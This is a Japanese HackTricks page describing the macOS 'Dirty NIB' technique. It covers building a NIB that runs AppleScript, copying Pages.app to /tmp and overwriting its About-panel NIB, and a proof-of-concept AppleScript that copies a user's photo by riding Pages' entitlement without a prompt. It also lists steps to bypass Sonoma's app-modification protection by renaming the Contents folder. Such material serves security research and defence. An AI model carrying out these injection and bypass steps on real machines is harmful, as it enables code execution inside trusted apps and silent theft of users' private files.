# macOS Dirty NIB

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのスワッグ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

**この技術は、以下の記事から取得されました** [**https://blog.xpnsec.com/dirtynib/**](https://blog.xpnsec.com/dirtynib/)

## 基本情報

NIBファイルは、Appleの開発エコシステムで**ユーザーインターフェース（UI）要素**とそのアプリケーション内での相互作用を定義するために使用されます。Interface Builderツールで作成され、ウィンドウ、ボタン、テキストフィールドなどの**シリアル化されたオブジェクト**を含み、設計されたUIを表示するためにランタイムでロードされます。Appleはまだ使用していますが、より視覚的なアプリケーションのUIフローを提供するためにStoryboardを推奨する方向に移行しています。

{% hint style="danger" %}
さらに、**NIBファイル**は**任意のコマンドを実行するためにも使用**でき、NIBファイルがアプリ内で変更された場合でも、**Gatekeeperはアプリの実行を許可**します。したがって、**アプリケーション内で任意のコマンドを実行**するために使用できます。
{% endhint %}

## Dirty NIB Injection <a href="#dirtynib" id="dirtynib"></a>

まず、新しいNIBファイルを作成する必要があります。構築の大部分にはXCodeを使用します。まず、インターフェースにオブジェクトを追加し、クラスをNSAppleScriptに設定します。

<figure><img src="../../../.gitbook/assets/image (681).png" alt="" width="380"><figcaption></figcaption></figure>

オブジェクトには、User Defined Runtime Attributesを使用して初期の`source`プロパティを設定する必要があります。

<figure><img src="../../../.gitbook/assets/image (682).png" alt="" width="563"><figcaption></figcaption></figure>

これにより、リクエストに応じて**AppleScriptを実行する**コード実行ガジェットが設定されます。AppleScriptの実行を実際にトリガーするために、現時点ではボタンを追加します（もちろん、これには創造的になることもできます ;)）。ボタンは、**作成したApple Scriptオブジェクトにバインド**され、**`executeAndReturnError:`セレクタを呼び出します**。

<figure><img src="../../../.gitbook/assets/image (683).png" alt="" width="563"><figcaption></figcaption></figure>

テストでは、次のApple Scriptを使用します：
```bash
set theDialogText to "PWND"
display dialog theDialogText
```
そして、XCodeデバッガでこれを実行し、ボタンをクリックすると：

<figure><img src="../../../.gitbook/assets/image (684).png" alt="" width="563"><figcaption></figcaption></figure>

NIBから任意のAppleScriptコードを実行できる能力を持っているので、次にターゲットが必要です。最初のデモとして、私たちはPagesを選びます。これはもちろんAppleのアプリケーションであり、私たちによって変更されるべきではありません。

まず、アプリケーションのコピーを`/tmp/`に取ります：
```bash
cp -a -X /Applications/Pages.app /tmp/
```
次に、Gatekeeperの問題を回避し、キャッシュされるようにするためにアプリケーションを起動します。
```bash
open -W -g -j /Applications/Pages.app
```
最初にアプリを起動（および終了）した後、既存のNIBファイルをDirtyNIBファイルで上書きする必要があります。デモの目的で、実行を制御するためにAbout Panel NIBを上書きします。
```bash
cp /tmp/Dirty.nib /tmp/Pages.app/Contents/Resources/Base.lproj/TMAAboutPanel.nib
```
一度nibを上書きしたら、`About`メニューアイテムを選択することで実行をトリガーできます。

<figure><img src="../../../.gitbook/assets/image (685).png" alt="" width="563"><figcaption></figcaption></figure>

Pagesをもう少し詳しく見てみると、ユーザーの写真にアクセスするためのプライベートな権限があることがわかります。

<figure><img src="../../../.gitbook/assets/image (686).png" alt="" width="479"><figcaption></figcaption></figure>

したがって、ユーザーにプロンプトを表示せずに、AppleScriptを**修正して写真を盗む**POCをテストすることができます。

{% code overflow="wrap" %}
```applescript
use framework "Cocoa"
use framework "Foundation"

set grabbed to current application's NSData's dataWithContentsOfFile:"/Users/xpn/Pictures/Photos Library.photoslibrary/originals/6/68CD9A98-E591-4D39-B038-E1B3F982C902.gif"

grabbed's writeToFile:"/Users/xpn/Library/Containers/com.apple.iWork.Pages/Data/wtf.gif" atomically:1
```
{% endcode %}

{% hint style="danger" %}
[**任意のコードを実行する悪意のある.xibファイルの例**](https://gist.github.com/xpn/16bfbe5a3f64fedfcc1822d0562636b4)
{% endhint %}

## 起動制約

基本的には、**予想される場所以外でアプリケーションを実行することを防止**するものです。したがって、Launch Constrains で保護されたアプリケーションを `/tmp` にコピーすると、実行できなくなります。\
[**この投稿で詳細を見つける**](../macos-security-protections/#launch-constraints)**。**

ただし、ファイル **`/System/Volumes/Preboot/*/boot/*/usr/standalone/firmware/FUD/StaticTrustCache.img4`** を解析すると、**Launch Constrains で保護されていないアプリケーション**がまだ見つかるため、**それら**に任意の場所に **NIB** ファイルを注入することができます（これらのアプリケーションを見つける方法については、前のリンクを参照してください）。

## 追加の保護

macOS Somona から、**アプリ内への書き込みを防ぐ保護**があります。ただし、バイナリのコピーを実行する前に、Contents フォルダの名前を変更することでこの保護を回避することができます。

1. `CarPlay Simulator.app` を `/tmp/` にコピーします。
2. `/tmp/Carplay Simulator.app/Contents` を `/tmp/CarPlay Simulator.app/NotCon` に名前を変更します。
3. バイナリ `/tmp/CarPlay Simulator.app/NotCon/MacOS/CarPlay Simulator` を実行して Gatekeeper にキャッシュします。
4. `NotCon/Resources/Base.lproj/MainMenu.nib` を `Dirty.nib` ファイルで上書きします。
5. `/tmp/CarPlay Simulator.app/Contents` に名前を変更します。
6. `CarPlay Simulator.app` を再度起動します。

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricks で会社を宣伝**したいですか？または、**PEASS の最新バージョンにアクセスしたり、HackTricks を PDF でダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) をご覧ください。独占的な [**NFT**](https://opensea.io/collection/the-peass-family) のコレクションです。
* [**公式の PEASS & HackTricks スワッグ**](https://peass.creator-spring.com) を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord グループ**](https://discord.gg/hRep4RUj7f) または [**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** をフォローしてください。**
* **ハッキングのトリックを共有するには、PR を** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
